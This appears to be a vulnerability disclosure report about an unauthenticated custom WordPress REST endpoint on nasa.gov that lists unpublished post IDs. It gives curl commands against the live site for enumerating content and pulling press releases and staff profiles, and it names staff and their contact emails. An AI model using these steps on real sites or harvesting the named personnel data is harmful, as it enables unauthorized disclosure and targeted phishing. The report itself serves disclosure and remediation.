# Broken Access Control: Unauthenticated Content Enumeration via Custom REST Endpoint Enables Full Disclosure of Unpublished Posts and Personnel Data

## Summary

A custom WordPress REST API endpoint at `https://www.nasa.gov/wp-json/nasa-external-content/v1/unpublished-posts` exposes approximately 3,969 unpublished post IDs and their modification timestamps without requiring any authentication. When chained with standard WordPress REST API endpoints, an attacker can access the full content of published posts including author names, contact email addresses, and detailed personnel biographies — using the exposed IDs as a discovery mechanism.

## Severity

**P3 - Medium (Information Disclosure / Broken Access Control)**

## Affected Target

- **URL:** https://www.nasa.gov
- **Platform:** WordPress 6.9.4

## Vulnerability Details

The custom `nasa-external-content` plugin registers a REST API endpoint that returns a JSON inventory of content across all post types (press-releases, people, missions, events, etc.) with their internal WordPress IDs and last-modified timestamps. This endpoint requires no authentication and has no access restrictions.

The exposed IDs can then be used with standard `/wp-json/wp/v2/{post-type}/{id}` endpoints to retrieve full content including:
- Full article body (HTML)
- Author names and profile URLs
- Contact email addresses (staff PII)
- Detailed personnel biographies
- Internal metadata and taxonomy information

## Steps to Reproduce

### Step 1: Enumerate unpublished content IDs

```bash
curl -s "https://www.nasa.gov/wp-json/nasa-external-content/v1/unpublished-posts"
```

**Result:** Returns JSON with ~3,969 post IDs organized by content type:
- `press-release`: Embargoed news releases
- `people`: Staff profiles
- `mission`: Mission information
- `event`: Upcoming events
- `topic`: Content topics
- `blogs-migration`: ~3,884 migrated blog entries
- And 20+ other content types

### Step 2: Access full press release content using exposed IDs

```bash
curl -s "https://www.nasa.gov/wp-json/wp/v2/press-release/878036"
```

**Result:** Returns the complete press release including:
- Title: "NASA, German Aerospace Center to Expand Artemis Campaign Cooperation"
- Full article content (HTML)
- Author: Gerelle Q. Dodson
- Contact emails: `bethany.c.stevens@nasa.gv`, `rachel.h.kraft@nasa.gov`
- Publication date, categories, tags, and internal metadata

### Step 3: Access personnel biographical data using exposed IDs

```bash
curl -s "https://www.nasa.gov/wp-json/wp/v2/people/522646"
```

**Result:** Returns full personnel biography including:
- Name: Janet Petro
- Title: Former Director, Kennedy Space Center
- Complete career history (NASA, SAIC, McDonnell Douglas)
- Awards and education details
- Employment dates and role transitions

### Step 4: Verify title disclosure via oEmbed

```bash
curl -s "https://www.nasa.gov/wp-json/oembed/1.0/embed?url=https://www.nasa.gov/?p=878036"
```

**Result:** Returns title, author name, author URL, and embeddable HTML content.

## Impact

1. **Content Enumeration Without Authentication:** The custom endpoint provides a complete inventory of NASA's content management system, including content not intended for public discovery at that time.

2. **Personnel Information Disclosure:** Staff email addresses and detailed biographical information are accessible, which could be leveraged for targeted phishing or social engineering campaigns against NASA personnel.

3. **Operational Intelligence:** Timestamps reveal NASA's content creation patterns and editorial schedule, indicating what announcements are being prepared and when.

4. **Attack Surface Mapping:** The endpoint reveals all custom post types in use (press-release, people, mission, event, podcast, gallery, stem-content, etc.), providing a comprehensive map of NASA's WordPress architecture for further research.

## Proof of Concept

### Endpoint 1 (Discovery):
```
GET https://www.nasa.gov/wp-json/nasa-external-content/v1/unpublished-posts
```

Response (truncated):
```json
{
  "post": {"1": {"id": 38714, "time": 1778509402}},
  "press-release": [{"id": 878036, "time": 1750170525}],
  "people": [
    {"id": 522646, "time": 1777657604},
    {"id": 85092, "time": 1777657756},
    {"id": 168165, "time": 1777659005}
  ],
  "mission": [{"id": 948619, "time": 1769479364}],
  "event": [{"id": 990028, "time": 1777050991}]
}
```

### Endpoint 2 (Content Access):
```
GET https://www.nasa.gov/wp-json/wp/v2/press-release/878036
```

Returns full press release with author email addresses (PII).

### Endpoint 3 (Personnel Data):
```
GET https://www.nasa.gov/wp-json/wp/v2/people/522646
```

Returns full biography of NASA personnel with career details.

## Suggested Remediation

1. **Immediate:** Add authentication requirement to the `/wp-json/nasa-external-content/v1/unpublished-posts` endpoint by implementing a `permission_callback` that checks for authenticated users with appropriate capabilities.

2. **Short-term:** Review all custom REST API endpoints registered by NASA plugins (`nasa-external-content`, `nasa-hds`, `nasa-apps`) to ensure proper access controls are enforced.

3. **Long-term:** Implement a REST API audit process to validate that no custom endpoints inadvertently expose internal content inventories or sensitive metadata without authentication.

## Environment

- **Browser:** N/A (API endpoint, tested via curl)
- **Target:** https://www.nasa.gov
- **Platform:** WordPress 6.9.4 on nginx
- **Date Tested:** June 2, 2026
